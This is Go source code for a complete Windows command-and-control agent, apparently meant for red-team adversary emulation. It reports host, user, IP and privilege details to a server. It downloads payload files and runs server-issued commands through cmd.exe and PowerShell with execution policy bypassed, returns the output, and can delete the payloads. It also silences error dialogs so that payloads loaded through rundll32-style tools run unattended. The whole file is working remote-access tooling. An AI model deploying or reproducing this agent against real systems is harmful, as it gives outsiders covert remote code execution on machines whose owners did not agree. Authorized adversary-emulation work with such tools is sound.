package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Changed from environment variable to a command-line flag.
var debug bool

// dprintf prints debug messages if the -debug flag is enabled.
func dprintf(format string, a ...interface{}) {
	if debug {
		fmt.Printf(format+"\n", a...)
	}
}

type Instruction struct {
	ID            string   `json:"id"`
	Sleep         int      `json:"sleep"`
	Command       string   `json:"command"`
	Executor      string   `json:"executor"`
	Timeout       int      `json:"timeout"`
	Payloads      []string `json:"payloads"`
	Uploads       []string `json:"uploads"`
	Deadman       bool     `json:"deadman"`
	DeletePayload bool     `json:"delete_payload"`
}

func (inst *Instruction) UnmarshalJSON(data []byte) error {
	type Alias Instruction
	aux := &struct {
		Deadman       interface{} `json:"deadman"`
		DeletePayload interface{} `json:"delete_payload"`
		*Alias
	}{
		Alias: (*Alias)(inst),
	}

	if err := json.Unmarshal(data, &aux); err != nil {
		return err
	}

	// Handle deadman conversion
	inst.Deadman = parseBoolField(aux.Deadman)

	// Handle delete_payload conversion
	inst.DeletePayload = parseBoolField(aux.DeletePayload)

	return nil
}

func parseBoolField(val interface{}) bool {
	switch v := val.(type) {
	case bool:
		return v
	case string:
		return v == "true" || v == "1" || v == "True" || v == "TRUE"
	case float64:
		return v != 0
	default:
		return false
	}
}

type BeaconResponse struct {
	Paw          string        `json:"paw"`
	Sleep        int           `json:"sleep"`
	Watchdog     int           `json:"watchdog"`
	Instructions []Instruction `json:"instructions"`
}

type ExecutionResult struct {
	ID       string `json:"id"`
	Output   string `json:"output"`
	Stderr   string `json:"stderr"`
	ExitCode int    `json:"exit_code"`
	Status   int    `json:"status"`
	PID      int    `json:"pid"`
}

type BeaconResult struct {
	Paw     string            `json:"paw"`
	Results []ExecutionResult `json:"results"`
}

var insecureTLS = false

func parseInstructions(raw interface{}) ([]Instruction, error) {
	var list []Instruction

	rawStr, ok := raw.(string)
	if !ok {
		return nil, fmt.Errorf("instructions field is not a string")
	}

	var jsonStrings []string
	if err := json.Unmarshal([]byte(rawStr), &jsonStrings); err != nil {
		return nil, fmt.Errorf("nested unmarshal failed: %v", err)
	}

	for _, s := range jsonStrings {
		dprintf("[DEBUG] Raw instruction JSON: %s", s)
		var inst Instruction
		if err := json.Unmarshal([]byte(s), &inst); err != nil {
			fmt.Printf("[ERROR] could not unmarshal instruction: %v\n", err)
			fmt.Printf("[ERROR] Problematic JSON: %s\n", s)
			continue
		}
		list = append(list, inst)
	}
	return list, nil
}

func getHTTPClient() *http.Client {
	// Always set an explicit timeout. Go's default client has NO timeout,
	// so a slow / hung / partially-responding server can pin the agent's
	// beacon loop indefinitely. 120s is generous enough to cover a busy
	// server under load and short enough that the agent recovers instead
	// of appearing dead. Connection-level timeouts on the Transport stop
	// individual DNS / TCP / TLS phases from hanging too.
	transport := &http.Transport{
		DialContext: (&net.Dialer{
			Timeout:   30 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		TLSHandshakeTimeout:   30 * time.Second,
		ResponseHeaderTimeout: 60 * time.Second,
		IdleConnTimeout:       90 * time.Second,
		MaxIdleConnsPerHost:   4,
	}
	if insecureTLS {
		transport.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	}
	return &http.Client{
		Transport: transport,
		Timeout:   120 * time.Second,
	}
}

func sendBeacon(server string, data map[string]interface{}) (*BeaconResponse, error) {
	jsonData, _ := json.Marshal(data)
	encoded := base64.StdEncoding.EncodeToString(jsonData)

	client := getHTTPClient()
	resp, err := client.Post(server+"/beacon", "text/plain", bytes.NewBuffer([]byte(encoded)))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("unexpected HTTP status: %d", resp.StatusCode)
	}

	body, _ := io.ReadAll(resp.Body)
	if len(body) == 0 {
		return nil, fmt.Errorf("empty body from server")
	}

	decoded, err := base64.StdEncoding.DecodeString(string(body))
	if err != nil {
		return nil, fmt.Errorf("base64 decode failed: %v", err)
	}

	dprintf("[DEBUG] Server response: %s", string(decoded))

	var raw map[string]interface{}
	if err := json.Unmarshal(decoded, &raw); err != nil {
		return nil, fmt.Errorf("json unmarshal failed: %v", err)
	}

	var br BeaconResponse
	br.Paw = raw["paw"].(string)
	br.Sleep = int(raw["sleep"].(float64))
	br.Watchdog = int(raw["watchdog"].(float64))

	instructions, err := parseInstructions(raw["instructions"])
	if err != nil {
		return nil, err
	}
	br.Instructions = instructions

	return &br, nil
}

func downloadPayload(server, name string) error {
	url := server + "/file/download"
	req, err := http.NewRequest("POST", url, nil)
	if err != nil {
		return err
	}
	req.Header.Set("file", name)

	client := getHTTPClient()
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("payload download HTTP %d", resp.StatusCode)
	}

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	if err := os.WriteFile(name, data, 0755); err != nil {
		return err
	}
	dprintf("[DEBUG] Payload saved: %s (%d bytes)", name, len(data))
	return nil
}

func isElevated() bool {
	var token windows.Token
	proc, err := windows.GetCurrentProcess()
	if err != nil {
		return false
	}

	err = windows.OpenProcessToken(proc, windows.TOKEN_QUERY, &token)
	if err != nil {
		return false
	}
	defer token.Close()

	var elevation uint32
	var returnedLen uint32
	err = windows.GetTokenInformation(token, windows.TokenElevation, (*byte)(unsafe.Pointer(&elevation)), uint32(unsafe.Sizeof(elevation)), &returnedLen)
	if err != nil {
		return false
	}

	return elevation != 0
}

func runInstruction(inst Instruction) ExecutionResult {
	out := ExecutionResult{ID: inst.ID}

	cmdBytes, err := base64.StdEncoding.DecodeString(inst.Command)
	if err != nil {
		out.Stderr = base64.StdEncoding.EncodeToString([]byte(err.Error()))
		out.ExitCode = 1
		return out
	}

	// FEATURE: Print command if debug is enabled
	dprintf("[DEBUG] Executing instruction ID %s with executor %s:\n---COMMAND---\n%s\n-------------", inst.ID, inst.Executor, string(cmdBytes))

	ctx := context.Background()
	var cancel context.CancelFunc
	if inst.Timeout > 0 {
		ctx, cancel = context.WithTimeout(ctx, time.Duration(inst.Timeout)*time.Second)
	} else {
		ctx, cancel = context.WithCancel(ctx)
	}
	defer cancel()

	// FEATURE: Support for different executors (psh, pwsh, cmd)
	var cmd *exec.Cmd
	switch inst.Executor {
	case "psh":
		cmd = exec.CommandContext(ctx, "powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", string(cmdBytes))
	case "pwsh":
		cmd = exec.CommandContext(ctx, "pwsh.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", string(cmdBytes))
	case "cmd":
		cmd = exec.CommandContext(ctx, "cmd.exe", "/c", string(cmdBytes))
	default:
		// Handle unknown executor by returning an error
		err := fmt.Errorf("unsupported executor: %s. Use one of [cmd, psh, pwsh]", inst.Executor)
		out.Stderr = base64.StdEncoding.EncodeToString([]byte(err.Error()))
		out.ExitCode = 1
		return out
	}

	// FEATURE: Detach process from parent.
	// This ensures that if the child process is killed, the agent itself is not.
	// CREATE_NEW_PROCESS_GROUP detaches the child from the parent's console.
	cmd.SysProcAttr = &syscall.SysProcAttr{
		CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP,
	}

	var stdoutBuf, stderrBuf bytes.Buffer
	cmd.Stdout = &stdoutBuf
	cmd.Stderr = &stderrBuf

	if err := cmd.Start(); err != nil {
		out.Stderr = base64.StdEncoding.EncodeToString([]byte(err.Error()))
		out.ExitCode = 1
		return out
	}

	waitErr := cmd.Wait()

	blocked := 0
	exitCode := 0

	if waitErr != nil {
		if ctx.Err() == context.DeadlineExceeded {
			exitCode = 124
		} else if exitErr, ok := waitErr.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		} else {
			blocked = 1
			exitCode = 1
		}
	}

	out.Output = base64.StdEncoding.EncodeToString(stdoutBuf.Bytes())
	out.Stderr = base64.StdEncoding.EncodeToString(stderrBuf.Bytes())
	out.ExitCode = exitCode
	out.Status = blocked
	if cmd.ProcessState != nil {
		out.PID = cmd.ProcessState.Pid()
	}

	dprintf("[DEBUG] PID %d exit=%d blocked=%d", out.PID, out.ExitCode, out.Status)

	return out
}

// suppressErrorDialogs sets the process error mode so that Windows does NOT
// pop a modal dialog when a child process (e.g. rundll32 loading a missing or
// invalid DLL) hits a critical error. Without this, abilities that intentionally
// load a payload via rundll32 — common in atomic-style abilities — will hang
// the child process forever waiting for someone to click OK on a dialog the
// non-interactive agent can never dismiss. The mode is inherited by child
// processes (powershell.exe, cmd.exe, and in turn rundll32.exe).
//
// Flags used:
//   SEM_FAILCRITICALERRORS (0x0001) — suppress critical-error dialogs
//   SEM_NOGPFAULTERRORBOX  (0x0002) — suppress general-protection-fault dialogs
//   SEM_NOOPENFILEERRORBOX (0x8000) — suppress "file not found" dialogs from OpenFile
func suppressErrorDialogs() {
	const (
		SEM_FAILCRITICALERRORS = 0x0001
		SEM_NOGPFAULTERRORBOX  = 0x0002
		SEM_NOOPENFILEERRORBOX = 0x8000
	)
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	setErrorMode := kernel32.NewProc("SetErrorMode")
	setErrorMode.Call(uintptr(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX))
}

func main() {
	// Suppress Windows error dialogs before doing anything else — child
	// processes inherit this mode, so rundll32 / regsvr32 / mshta failures
	// will return an error code instead of hanging on a modal dialog.
	suppressErrorDialogs()

	// FEATURE: Added command-line flag parsing for debug, server, and insecure options.
	serverURL := flag.String("server", "", "C2 server URL (e.g., http://127.0.0.1:8888)")
	insecureFlag := flag.Bool("insecure", false, "Disable TLS certificate verification")
	debugFlag := flag.Bool("debug", false, "Enable verbose debug output")
	flag.Parse()

	if *serverURL == "" {
		fmt.Println("Error: -server flag is required.")
		flag.Usage()
		os.Exit(1)
	}

	debug = *debugFlag
	insecureTLS = *insecureFlag
	server := *serverURL

	if insecureTLS {
		fmt.Println("[WARN] TLS certificate verification is disabled")
	}
	if debug {
		fmt.Println("[INFO] Debug mode is enabled")
	}

	hostname, _ := os.Hostname()
	var ipList []string
	ifaces, _ := net.Interfaces()
	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, _ := iface.Addrs()
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			if ip == nil || ip.IsLoopback() {
				continue
			}
			if ipv4 := ip.To4(); ipv4 != nil {
				ipList = append(ipList, ipv4.String())
			}
		}
	}

	hostField := hostname
	displayName := hostname

	privilege := "User"
	if isElevated() {
		privilege = "Elevated"
	}

	// FEATURE: Added "psh" and "pwsh" to the list of supported executors.
	agent := map[string]interface{}{
		"platform":        runtime.GOOS,
		"host":            hostField,
		"display_name":    displayName,
		"group":           "red",
		"username":        os.Getenv("USERNAME"),
		"architecture":    runtime.GOARCH,
		"executors":       []string{"cmd", "psh", "pwsh"},
		"privilege":       privilege,
		"pid":             os.Getpid(),
		"ppid":            os.Getppid(),
		"location":        os.Args[0],
		"exe_name":        os.Args[0],
		"host_ip_addrs":   ipList,
		"deadman_enabled": true,
	}

	for {
		resp, err := sendBeacon(server, agent)
		if err != nil {
			fmt.Println("[ERROR] beacon:", err)
			time.Sleep(10 * time.Second)
			continue
		}
		dprintf("[DEBUG] Beacon OK – paw=%s, tasks=%d", resp.Paw, len(resp.Instructions))

		agent["paw"] = resp.Paw

		var results []ExecutionResult

		for _, inst := range resp.Instructions {
			for _, p := range inst.Payloads {
				if err := downloadPayload(server, p); err != nil {
					fmt.Println("[ERROR] payload:", err)
				}
			}

			res := runInstruction(inst)
			results = append(results, res)

			if inst.DeletePayload {
				for _, p := range inst.Payloads {
					if err := os.Remove(p); err == nil {
						dprintf("[DEBUG] Payload removed: %s", p)
					}
				}
			}
		}

		if len(results) > 0 {
			beaconResult := BeaconResult{Paw: resp.Paw, Results: results}
			jsonResults, _ := json.Marshal(beaconResult)

			// FEATURE: Print agent response if debug is enabled
			dprintf("[DEBUG] Sending results:\n%s", string(jsonResults))

			encoded := base64.StdEncoding.EncodeToString(jsonResults)
			client := getHTTPClient()
			postResp, err := client.Post(server+"/beacon", "text/plain", bytes.NewBuffer([]byte(encoded)))
			if err != nil {
				fmt.Println("[ERROR] send results:", err)
			} else {
				// CRITICAL: must drain + close the response body. Without this Go
				// keeps the underlying TCP connection pinned and never returns it
				// to the pool, leaking one connection per successful results-send.
				// After enough operations the agent runs out of sockets / file
				// descriptors and silently stops being able to beacon — looks
				// exactly like the agent has died.
				io.Copy(io.Discard, postResp.Body)
				postResp.Body.Close()
				dprintf("[DEBUG] Results sent (%d)", len(results))
			}
		}

		time.Sleep(time.Duration(resp.Sleep) * time.Second)
	}
}
